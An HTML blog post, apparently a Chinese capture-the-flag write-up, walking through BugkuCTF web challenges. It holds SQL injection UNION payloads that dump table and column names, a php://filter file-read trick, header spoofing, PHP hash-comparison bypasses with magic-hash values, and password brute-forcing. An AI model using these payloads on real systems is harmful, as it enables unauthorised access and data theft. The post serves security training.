@@ -1,0 +1,960 @@
+<html>
+<head>
+    <meta charset="utf-8"/>
+<meta name="description" content=""/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<title>BugkuCTF——wp(旧版) | YGLF</title>
+
+<link rel="shortcut icon" href="https://yglf.github.io/yageluofu.github.io/favicon.ico?v=1704854943968">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://yglf.github.io/yageluofu.github.io/styles/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css">
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dart.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script>
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <div class="navbar-brand">
+        <img class="user-avatar" src="/yageluofu.github.io/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            YGLF
+        </div>
+    </div>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+                <div class="nav-item">
+                    
+                        <a href="https://yglf.github.io/yageluofu.github.io" class="menu gt-a-link">
+                            首页
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="https://yglf.github.io/yageluofu.github.io/YGLF" class="menu gt-a-link">
+                            归档
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="https://yglf.github.io/yageluofu.github.io/tags" class="menu gt-a-link">
+                            标签
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="https://yglf.github.io/yageluofu.github.io/关于" class="menu gt-a-link">
+                            关于
+                        </a>
+                    
+                </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1704854943968" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    BugkuCTF——wp(旧版)
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2020-04-25 ·
+                    </time>
+                    
+                        <a href="https://yglf.github.io/yageluofu.github.io/CTF/" class="post-tags">
+                            # CTF
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="web篇"><strong>Web篇</strong></h1>
+<h2 id="0x001web2"><strong>0x001—web2</strong></h2>
+<h3 id="解题思路"><strong>解题思路：</strong></h3>
+<p><strong>1、直接按F12即可找到</strong></p>
+<h2 id="0x002计算器"><strong>0x002—计算器</strong></h2>
+<h3 id="解题思路-2"><strong>解题思路：</strong></h3>
+<p><strong>1、按下F12发现它对输入框的长度进行了限制，先将长度调大</strong></p>
+<p><strong>2、在计算给出的题点击验证即可。</strong></p>
+<h2 id="0x003web基础-_get"><strong>0x003—web基础 $_GET</strong></h2>
+<h3 id="解题思路-3"><strong>解题思路：</strong></h3>
+<p><strong>1、提交数据方式为GET传参，所以直接what=flag即可</strong></p>
+<p><strong>参考playload:<code>http://123.206.87.240:8002/get/?what=flag</code></strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/15fed0be4422a7ea808d61e928562322.png" alt="" loading="lazy"></strong></p>
+<h2 id="0x004web基础-_post"><strong>0x004—web基础 $_POST</strong></h2>
+<h3 id="解题思路-4"><strong>解题思路：</strong></h3>
+<p><strong>1、此题是POST传参，来提交数据的所以我们利用Hackbar传参即可得到Flag</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/39764037a876ad7272dcd3d9ef1e24f8.png" alt="" loading="lazy"></strong></p>
+<h2 id="0x005矛盾"><strong>0x005—矛盾</strong></h2>
+<h3 id="解题思路-5"><strong>解题思路：</strong></h3>
+<p><strong>1、读代码发现判断num是否为数字1，不是则输出数字1，这样看起来是自相矛盾的所以我们可以让一个是1但不一定是纯数字型的1。</strong></p>
+<p><strong>请参考playload：<code>http://123.206.87.240:8002/get/index1.php?num=1a.5616</code></strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/18d02b51305e1ed7bbde4eefdd0d0b42.png" alt="" loading="lazy"></strong></p>
+<h2 id="0x006web3"><strong>0x006—web3</strong></h2>
+<h3 id="解题思路-6"><strong>解题思路：</strong></h3>
+<p><strong>1、点击进去后出来弹窗，按F12后进入到Sources中进入首页发现有许多的JS，但最后有一串很特殊的字符，通过Unicode解码发现Flag。</strong></p>
+<p><strong>2、或者直接将此特殊字符复制到新建对话框中，浏览器自动解析出Flag。</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/2476f760075a10a8375b26fb2ec15808.png" alt="" loading="lazy"></strong></p>
+<h2 id="0x007域名解析"><strong>0x007—域名解析</strong></h2>
+<h3 id="解题思路-7"><strong>解题思路：</strong></h3>
+<p><strong>1、这题刚开始打开是没啥头绪的，查看了一些资料和相关的题目后进行尝试，最后发现在Windows中找到<code>C:\Windows\System32\drivers\etc\hosts</code>在利用TXT打开它，在后面增加一条<code> 123.206.87.240 flag.baidu.com</code>保存即可。</strong></p>
+<p><strong>2、在打开浏览器访问<code>flag.baidu.com</code>即可得到Flag。</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/8dc6f69bc61a5e153573104f3846ac12.png" alt="" loading="lazy"></strong></p>
+<h2 id="0x008你必须让他停下"><strong>0x008—你必须让他停下</strong></h2>
+<h3 id="解题思路-8"><strong>解题思路：</strong></h3>
+<p><strong>1、通过抓包，抓取数据包，在到Repeater中进行查找Flag，点击Go，将网页格式改为HTML方便查看Flag，最终查到Flag。</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/46f2dbf9bfa9a3d29ddaa570870450a6.png" alt="" loading="lazy"></strong></p>
+<h2 id="0x009本地包含"><strong>0x009—本地包含</strong></h2>
+<h3 id="解题思路-9"><strong>解题思路：</strong></h3>
+<p><strong>网页打开后没有任何显示</strong></p>
+<h2 id="0x010变量1"><strong>0x010—变量1</strong></h2>
+<h3 id="解题思路-10"><strong>解题思路：</strong></h3>
+<p><strong>1、首先代码审计</strong></p>
+<p><strong>error_reporting(0);  （ 代表关闭报错提示 ）</strong><br>
+<strong>include &quot;flag1.php&quot;;（ 包含文件 flag1.php ）</strong><br>
+<strong>highlight_file(file);（ 对文件进行语法高亮显示 ）</strong><br>
+<strong>if(isset($_GET['args'])){ （ 条件判断 get方法传递的args参数是否存在存在为真 ）<br>
+$args = $_GET['args'];（ 赋值给变量  <span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \w at position 32: …!preg_match(&quot;/^\̲w̲+'>args ）**
+  **if(!preg_match(&quot;/^\w+</span>/&quot;,$args)){（ 正则表达式判断 ）  if条件判断 <span class='katex-error' title='ParseError: KaTeX parse error: Expected &#039;EOF&#039;, got &#039;}&#039; at position 79: …error！ ）**
+  **}̲**
+  **eval(&quot;va…'>args 是否符合正则表达式格式  不符合返回true  
+    die(&quot;args error!&quot;);（ 输出 args error！ ）**
+  **}**
+  **eval(&quot;var_dump(</span>$args);&quot;);（ eval()函数 将字符串作为php代码执行结尾加分号 ）</strong><br>
+<strong>}</strong></p>
+<h2 id="0x011web5"><strong>0x011—web5</strong></h2>
+<h3 id="解题思路-11"><strong>解题思路：</strong></h3>
+<p><strong>1、首先查看了下源代码，发现有一大串特殊的符号，利用在线解码器发现没有任何用，于是放在了控制台中回车出现了Flag。</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/d325e1e4cf3a29dab547693fec3e2274.png" alt="" loading="lazy"></strong></p>
+<h2 id="0x012头等舱"><strong>0x012—头等舱</strong></h2>
+<h3 id="解题思路-12"><strong>解题思路：</strong></h3>
+<p><strong>1、打开网页发现真的什么都没有，检查源码发现有个id为<code> wordTrans2008342469</code>所以可以推断出，这个网页还是有东西的。</strong></p>
+<p><strong>2、利用抓包软件抓包，发现在数据头中真的有点东西，即得到Flag。</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/4b25769d08b300f0cd21670641f3b5d6.png" alt="" loading="lazy"></strong></p>
+<h2 id="0x013网站被黑"><strong>0x013—网站被黑</strong></h2>
+<h3 id="解题思路-13"><strong>解题思路：</strong></h3>
+<p><strong>1、首先查看源代码，发现没有任何有关信息，我们用御剑进行后台扫描，发现了一个shell.php的网站，打开它发现需要密码。</strong></p>
+<p><strong>2、利用抓包，进行暴力破解，这个过程需要很长的时间，最后发现有个长度不一样的，那个就是后门密码。</strong></p>
+<p><strong>3、在得到的shell网站中输入后门密码得到Flag。</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/c3a3245cf586e3549cfe03ae29fec1d9.png" alt="" loading="lazy"></strong></p>
+<h2 id="0x014管理员系统"><strong>0x014—管理员系统</strong></h2>
+<h3 id="解题思路-14"><strong>解题思路：</strong></h3>
+<p><strong>1、打开网站后发现是一个登录界面，我们按F12发现一串特殊的代码，我们利用HackBar中的Base64解码得到 test123 于是猜测这个有可能是密码，进行尝试显示的是 IP禁止访问，请联系本地管理员登陆，IP已被记录.    本地管理员，意思是需要通过本地管理员才可以，查询了一下发现X-Forwarded-For东西，                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   代表客户端，作用是获得HTTP请求端真实的IP。</strong></p>
+<p><strong>2、我们伪造一个请求头，在发送得到Flag。</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/8d1e56dee1e73025f65327bd31e10330.png" alt="" loading="lazy"></strong></p>
+<h2 id="0x015web4"><strong>0x015—web4</strong></h2>
+<h3 id="解题思路-15"><strong>解题思路：</strong></h3>
+<p><strong>1、进入网页首先看到他让我们查看源代码，按F12进行查看，发现在JS中有个很特别的字符串，我们尝试用URL进行解码，发现了他的源代码，进行审计发现他让我们将p1中if里的字符串与p2和p2之前的字符串进行结合，结合后将得到的字符串输入到对话框中，得到Flag。</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/9ee2e23ba932a0b798e10194f7ced1e9.png" alt="" loading="lazy"></strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/ea010c8daafa2a6959e064330be39d45.png" alt="" loading="lazy"></strong></p>
+<h2 id="0x016flag在index里"><strong>0x016—flag在index里</strong></h2>
+<h3 id="解题思路-16"><strong>解题思路：</strong></h3>
+<p><strong>1、进入网站后，发现只有个A链接，点后发现跳转后的网页里没有任何的异常之处，审题目发现Flag在首页中，我们构造playload，<code>http://123.206.87.240:8005/post/index.php?file=index.php</code>发现进入的首页是空白的，此时想到有可能是加密的网页。</strong></p>
+<p><strong>2、对网页进行Base64解密<code>http://123.206.87.240:8005/post/index.php?file=php://filter/convert.base64-encode/resource=index.php</code>成功进入首页后发现了一串代码，利用Base64解码得到源码，发现Flag就在源码中。</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/b2aa17b2329e292ce89c2e79518455ec.png" alt="1597290691206" loading="lazy"></strong></p>
+<h2 id="0x017输入密码查看flag"><strong>0x017—输入密码查看flag</strong></h2>
+<h3 id="解题思路-17"><strong>解题思路：</strong></h3>
+<p><strong>1、打开首页发现是一个五位数纯数字密码，利用BurpsuiteUnlimited进行暴力破解，破解过程有点漫长，最终得到密码<code>13579</code></strong></p>
+<p><strong>2、输入密码，得到Flag</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/bc170ec27b5825e73b43013417063a2e.png" alt="1597293832943" loading="lazy"></strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/d90ea3bbba18ab8b259ea21ef3ea105c.png" alt="1597293809851" loading="lazy"></strong></p>
+<h2 id="0x018备份是个好习惯"><strong>0x018—备份是个好习惯</strong></h2>
+<h3 id="解题思路-18"><strong>解题思路：</strong></h3>
+<p><strong>1、打开网页发现有一串字母，对它进行各种解密发现没啥用，仔细看发现他是一个相同的字符串组合在一起的，题目让我们养成备份的好习惯，那我们就找下有没有<code>.bak</code>后缀的备份文件，发现在网页中是找不到的。</strong></p>
+<p><strong>2、所以利用御剑去扫描他的后台，发现了一个<code>http://123.206.87.240:8002/web16/index.php.bak</code>的网址，打开它后下载下来，用记事本打开发现里面有个很像Flag的东西，代码审计发现使用MD5进行加密的。</strong></p>
+<p><strong>3、我们尝试绕过， parse_str()函数，它的作用是将字符串解析到变量中</strong></p>
+<p><strong>4、构造playload<code>kkeyey1[]=1&amp;kkeyey2[]=2</code>,之后会发现Flag。</strong></p>
+<p><strong>请参考playload:<code>http://123.206.87.240:8002/web16/?kkeyey1[]=a&amp;kkeyey2[]=b</code></strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/323b5e4a6777a97a942fcb9695ce1cf2.png" alt="1597295236129" loading="lazy"></strong></p>
+<h2 id="0x019成绩单"><strong>0x019—成绩单</strong></h2>
+<h3 id="解题思路-19"><strong>解题思路：</strong></h3>
+<p><strong>1、这道题是典型的注入题。</strong></p>
+<p><strong>(1)首先输入1</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/b8cd49c09e67f8eaf17acf38f256e0d5.png" alt="1597296230982" loading="lazy"></strong></p>
+<p><strong>再输入2</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/ebdc313b2fa6d291da7d41ae62f5f594.png" alt="1597296251842" loading="lazy"></strong></p>
+<p><strong>再输入3</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/f7b065355ea72776ae6420bd9bdc9181.png" alt="1597296266882" loading="lazy"></strong></p>
+<p><strong>再输入4</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/602b143ea93bff5fcfca3d0e7a20f4c3.png" alt="1597296288857" loading="lazy"></strong></p>
+<p><strong>由此说明有三个字段</strong></p>
+<p><strong>(2)尝试手动注入</strong></p>
+<p><strong>输入1’   报错</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/602b143ea93bff5fcfca3d0e7a20f4c3.png" alt="1597296288857" loading="lazy"></strong></p>
+<p><strong>输入1‘--+  报错</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/602b143ea93bff5fcfca3d0e7a20f4c3.png" alt="1597296288857" loading="lazy"></strong></p>
+<p><strong>输入1’#   无报错</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/490e9beb93c8b09507ce09880f7a4cf5.png" alt="1597296816384" loading="lazy"></strong></p>
+<p><strong>输入1’+  报错</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/602b143ea93bff5fcfca3d0e7a20f4c3.png" alt="1597296288857" loading="lazy"></strong></p>
+<p><strong>说明+-- 都被过滤掉了</strong></p>
+<p><strong>(3)尝试看数据库有几列</strong></p>
+<p><strong>1 2 3  4所对应的是	姓名	Math	English	Chinese</strong></p>
+<p><strong>利用 Order By 查看有几列</strong></p>
+<p><strong>1' order by 4#  回显正常</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/8cb5bb06a4b1c25962671faee920e848.png" alt="1597297180131" loading="lazy"></strong></p>
+<p><strong>1‘order by 5# 回显异常</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/8e03b87006915bc0b4e2b366a44b7cd9.png" alt="1597297285672" loading="lazy"></strong></p>
+<p><strong>所以可以确定有四列</strong></p>
+<p><strong>(4)接下来开始	爆库	爆表	爆字段</strong></p>
+<p><strong>构造id=-1’ union select 1,2,3,4#   回显正常</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/5c3b84b5547ae515c4adb79c0ac34ff7.png" alt="1597297931654" loading="lazy"></strong></p>
+<p><strong>查看数据库名称</strong></p>
+<p><strong>构造 id=-1' union select 1,2,3,database()#  回显正常</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/88b51fde2c208b33b2af81c054ab5bdb.png" alt="1597298016782" loading="lazy"></strong></p>
+<p><strong>查看表名</strong></p>
+<p><strong>id=-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#  回显正常</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/c8bca63505a4362f6c732d8523cec336.png" alt="1597298082252" loading="lazy"></strong></p>
+<p><strong>爆字段名</strong></p>
+<p><strong>id=-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467#</strong></p>
+<p><strong>这里需要用到16进制的编码来绕过,Flag是敏感信息有可能会被过滤掉，为了稳妥直接利用16进制绕过。</strong></p>
+<p><strong>经过验证Flag被过滤掉了</strong></p>
+<p><strong>playload：<code>id=-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=fl4g.sc#</code>    回显异常</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/e96ed7191a3322e186b4f8958f426ebd.png" alt="1597298290141" loading="lazy"></strong></p>
+<p><strong>最后查询数据</strong></p>
+<p><strong>playload： id=-1' union select 1,2,3,skctf_flag from fl4g#</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/24c4e2cc1e170d6c9c569c6103a4fba6.png" alt="1597298371443" loading="lazy"></strong></p>
+<h2 id="0x020cookies欺骗"><strong>0x020—cookies欺骗</strong></h2>
+<h3 id="解题思路-20"><strong>解题思路：</strong></h3>
+<p><strong>1、打开首页发现有一串很长的字符串，进行解密，发现没啥用，注意到了URL中的<code>filename=a2V5cy50eHQ=</code>filename后面的看起来有点古怪，利用base64进行解码，发现是 keys.txt 。尝试filename后面访问首页index.php，这里利用base64对index.php进行编码，发现没有啥变化，重新审URL发现里面有个line行数。</strong></p>
+<p><strong>2、在行数后面添加数字，发现出现代码，怀疑有可能是源码，通过一行一行的审计，发现必须满足<code>if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin'){</code>margin=margin 才可以访问 key.php，再将key.php进行base64编码。</strong></p>
+<p><strong>3、执行后是空白的，检查源代码，发现Flag。</strong></p>
+<p><strong>方法二、</strong></p>
+<p><strong>之前的方法跟步骤1 2 一样，但在解码后的步骤有些不一样，利用BurpUnlimited抓包，再将Cookie改为Cookie:margin=margin，GO即可得到Flag。</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/57f531b62f49fefadf18ddd53d4fecd8.png" alt="1597303459385" loading="lazy"></strong></p>
+<h2 id="0x021never-give-up"><strong>0x021—never give up</strong></h2>
+<h3 id="解题思路-21"><strong>解题思路：</strong></h3>
+<p><strong>1、代开网站后查看源代码发现没啥特别的，再看URL，发现在URL中有个id=1的东西，再看源代码中也有一个和他很像的字符，将源代码中的字符放到id=的后面执行，发现没有啥用.</strong></p>
+<p><strong>playload：<code>view-source:http://123.206.87.240:8006/test/hello.php?id=1p.html </code></strong></p>
+<p><strong>再将hello.php与id=删除，执行后面的1p.html网页,发现网页跳转了，尝试查看源代码，发现是bugku的网站，想办法让它不跳转网页，在之前playload的网页中直接查看源代码，在源代码的URL中进行执行，网页未跳转但发现了一串字符串，尝试用URL进行解码，再用base64进行解码，在用URL进行解码，得到源代码，审计后发现只需要访问	f4l2a3g.txt 即可得到Flag。</strong></p>
+<p><strong>注：只需要制框内的代码进行解密即可。</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/a1cdedf6491b9abcdb646eb422748d9e.png" alt="1597305353629" loading="lazy"></strong></p>
+<p><strong>解码顺序：<code>URL==》base64==》URL</code></strong></p>
+<p><strong>参考playload：<code>view-source:http://123.206.87.240:8006/test/f4l2a3g.txt</code></strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/eab7af83a29aa79259903a672a81e840.png" alt="1597305116804" loading="lazy"></strong></p>
+<h2 id="0x022字符正则"><strong>0x022—字符？正则？</strong></h2>
+<h3 id="解题思路-22"><strong>解题思路：</strong></h3>
+<p><strong>1、这是一道正则题，打开首页发现他直接把源代码给你了。</strong></p>
+<p><strong>2、尝试审计</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/bfa8f6cba41bc394cb58541cbb7713d1.png" alt="1597305894537" loading="lazy"></strong></p>
+<p><strong>（1） /代表匹配的开始与结束两个/里面的内容就是要匹配的内容</strong></p>
+<p>**（2） .代表数字匹配任意数字，<em>代表匹配0-n次两者结合.<em>就是匹配任一个数字任意次</em></em></p>
+<p><strong>（3） {4,7}表示匹配前一个字符4到7次</strong></p>
+<p><strong>（4） \表示要找\后面的内容，/./就是找/数字/</strong></p>
+<p><strong>（5） [a-z]就是匹配a-z之间的字符</strong></p>
+<p><strong>（6） [[:punct:]]代表任意标点</strong></p>
+<p><strong>（7） i代表字体大小</strong></p>
+<p><strong>正则表达字符含义：<code> https://www.cnblogs.com/afarmer/archive/2011/08/29/2158860.html</code></strong></p>
+<p><strong>请参考playload：<code>key2key2222key:/2/2keya.</code></strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/ebddb5c148163a5cbd43b757a4915667.png" alt="1597307040549" loading="lazy"></strong></p>
+<h2 id="0x023你从哪里来"><strong>0x023—你从哪里来</strong></h2>
+<h3 id="解题思路-23"><strong>解题思路：</strong></h3>
+<p><strong>1、首先观察打开的页面，发现没有任何特别的地方，查看源码   无果。</strong></p>
+<p><strong>2、抓包没有任何的特别，判断需要在这里添加一个请求头部。</strong></p>
+<p><strong>3、伪造一个头部，去请求 google 。</strong></p>
+<p><strong>注：referer 	表示一个来源。</strong></p>
+<p><strong>参考playload:<code>referer: https://www.google.com</code></strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/46acffc7c41f0205d7154791901c65cc.png" alt="" loading="lazy"></strong></p>
+<h2 id="0x024md5-collisionnupt_ctf"><strong>0x024—md5 collision(NUPT_CTF)</strong></h2>
+<h3 id="解题思路-24"><strong>解题思路：</strong></h3>
+<p><strong>1、首先进入首页，发现有行英文意思为<code>请输入一个</code>。查看源代码	无果</strong></p>
+<p><strong>2、尝试用BP抓包	无果</strong></p>
+<p><strong>3、在解读题目</strong></p>
+<p><strong>md5碰撞</strong></p>
+<p><strong>发现需利用	0E开头的字符串进行绕过。</strong></p>
+<p><strong>其原理为：在PHP中处理哈希字符串时会利用”！=	&amp;	”==”对哈希值进行比较它把每一个以”0E”开头的哈希值都		解释为0,以如果两个不同的密码经过哈希以后,哈希值都是以”0E”开头的,么PHP将会认为他们相同，都是0。</strong></p>
+<p><strong>本题原理为利用	0E	字符串，如果在数据库中有哈希值	0E	开头的密码就可以，以这个用户的身份登陆进去。</strong></p>
+<p><strong>尽管没有正真的密码。</strong></p>
+<p><strong>4、尝试在URL里进行绕过。</strong></p>
+<p><strong>参考playload:<code>http://123.206.87.240:9009/md5.php?a=s1836677006a</code></strong></p>
+<p><strong>注:a此后的0E值是可以改变的。</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/5ffe389629a28ea5bdcd22119adc8f0d.png" alt="" loading="lazy"></strong></p>
+<p><strong>部分哈希值：</strong></p>
+<pre><code>0e开头的md5和原值：
+ 
+s878926199a
+0e545993274517709034328855841020
+s155964671a
+0e342768416822451524974117254469
+s214587387a
+0e848240448830537924465865611904
+s214587387a
+0e848240448830537924465865611904
+s878926199a
+0e545993274517709034328855841020
+s1091221200a
+0e940624217856561557816327384675
+s1885207154a
+0e509367213418206700842008763514
+s1502113478a
+0e861580163291561247404381396064
+s1885207154a
+0e509367213418206700842008763514
+s1836677006a
+0e481036490867661113260034900752
+s155964671a
+0e342768416822451524974117254469
+s1184209335a
+0e072485820392773389523109082030
+s1665632922a
+0e731198061491163073197128363787
+s1502113478a
+0e861580163291561247404381396064
+s1836677006a
+0e481036490867661113260034900752
+s1091221200a
+0e940624217856561557816327384675
+s155964671a
+0e342768416822451524974117254469
+s1502113478a
+0e861580163291561247404381396064
+s155964671a
+0e342768416822451524974117254469
+s1665632922a
+0e731198061491163073197128363787
+s155964671a
+0e342768416822451524974117254469
+s1091221200a
+0e940624217856561557816327384675
+s1836677006a
+0e481036490867661113260034900752
+s1885207154a
+0e509367213418206700842008763514
+s532378020a
+0e220463095855511507588041205815
+s878926199a
+0e545993274517709034328855841020
+s1091221200a
+0e940624217856561557816327384675
+s214587387a
+0e848240448830537924465865611904
+s1502113478a
+0e861580163291561247404381396064
+s1091221200a
+0e940624217856561557816327384675
+s1665632922a
+0e731198061491163073197128363787
+s1885207154a
+0e509367213418206700842008763514
+s1836677006a
+0e481036490867661113260034900752
+s1665632922a
+0e731198061491163073197128363787
+s878926199a
+0e545993274517709034328855841020
+
+</code></pre>
+<h2 id="0x025程序员本地网站"><strong>0x025—程序员本地网站</strong></h2>
+<h3 id="解题思路-25"><strong>解题思路：</strong></h3>
+<p><strong>1、打开网站	查看源码	无果</strong></p>
+<p><strong>2、利用BP抓包，任何发现	题目说本地网站，意思是要从本地去访问</strong></p>
+<p><strong>3、构造请求头<code> X-Forwarded-For:127.0.0.1</code>继续访问得到Flag</strong></p>
+<p><strong>参考playload:<code>X-Forwarded-For: 127.0.0.1</code></strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/eb125ced873e2681c9f0a43b2f7391dd.png" alt="" loading="lazy"></strong></p>
+<p><strong>X-Forwarded-For: 简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载		均衡服务器时才会添加该项。</strong></p>
+<h2 id="0x026各种绕过"><strong>0x026—各种绕过</strong></h2>
+<h3 id="解题思路-26"><strong>解题思路：</strong></h3>
+<p><strong>1、打开网页发现源码</strong></p>
+<p><strong>2、源码审计</strong></p>
+<pre><code>&lt;?php
+highlight_file('flag.php');		//
+$_GET['id'] = urldecode($_GET['id']);	//
+$flag = 'flag{xxxxxxxxxxxxxxxxxx}';		//
+if (isset($_GET['uname']) and isset($_POST['passwd'])) {	//
+    if ($_GET['uname'] == $_POST['passwd'])		//
+
+        print 'passwd can not be uname.';	//
+
+    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin'))	//
+
+        die('Flag: '.$flag);	//
+
+    else
+
+        print 'sorry!';		//
+
+}
+?&gt;
+id、uname通过get方法传值，passwd通过post方法传值且如果想要进入内层循环必须传入uname和passwd
+uname和passwd弱类型不相等
+uname和passwd加密后的值强相等
+id字段url解码后=‘margin’
+</code></pre>
+<p><strong>只要使uname的sha1的值与passwd的sha1的值相等即可，但是同时他们两个的值又不能相等 ，这里就得需要</strong></p>
+<p><strong>sha1函数无法处理数组的特性， 当对sha1()函数传入数组时会返回null，由此，只需要传入两个不同的数组即可成功	   绕过。 得到Flag</strong></p>
+<p><strong>构造payload：<code>http://123.206.87.240:8002/web7/?uname[]=1&amp;id=margin</code>	在post data 中<code>passwd[]=2</code></strong></p>
+<p><strong>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-IFU8LoBm-1608735278117)(E:\1-信息安全暑期培训\CTF自学\Bagku\BugkuCTF—wp.assets\1598082656479.png)]</strong></p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/d96da902010b47458eedf70a0dd091d6.png" alt="" loading="lazy"></strong></p>
+<h2 id="0x027web8"><strong>0x027—web8</strong></h2>
+<h3 id="解题思路-27"><strong>解题思路：</strong></h3>
+<p><strong>1、打开首页发现源码，源码审计</strong></p>
+<pre><code>&lt;?php
+extract($_GET);		//extract() 函数从数组中将变量导入到当前的符号表。
+if (!empty($ac))
+{
+$f = trim(file_get_contents($fn));		//trim()去除字符串首尾处的空白字符（或者其他字符）
+if ($ac === $f)
+{
+echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;;
+}
+else
+{
+echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;
+}
+}
+?&gt;
+</code></pre>
+<p><strong>extract() -使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应		的一个变量.</strong></p>
+<p><strong>empty()-判断一个变量是否被认为是空的。当一个变量并不存在，或者它的值等同于FALSE，那么它会被认为不存		在。如果变量不存在的话，empty()并不会产生警告。</strong></p>
+<p><strong>trim()-移除字符串两侧的空白字符或其他预定义字符。</strong></p>
